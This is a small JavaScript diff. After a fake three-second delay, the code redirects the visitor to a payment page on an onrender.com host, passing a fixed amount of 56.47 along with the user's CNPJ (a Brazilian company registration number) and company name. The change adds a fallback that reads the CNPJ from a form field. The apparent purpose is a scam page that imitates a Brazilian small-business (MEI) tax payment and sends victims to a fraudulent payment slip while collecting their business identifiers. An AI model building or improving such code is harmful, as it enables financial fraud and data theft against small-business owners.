@@ -1531,7 +1531,8 @@ const infoItems = [
 
             try {
                 await new Promise(resolve => setTimeout(resolve, 3000));
-                const cnpj = cnpjData?.cnpj || '';
+                const cnpjInput = document.getElementById('cnpj');
+                const cnpj = cnpjData?.cnpj || cnpjInput?.value?.replace(/\D/g, '') || '';
                 const razaoSocial = cnpjData?.company?.name || cnpjData?.name || '';
                 const encodedRazaoSocial = encodeURIComponent(razaoSocial);
                 window.location.href = `https://disk-pag.onrender.com/boletomei/?subtotal=56.47&cnpj=${cnpj}&razao_social=${encodedRazaoSocial}`;
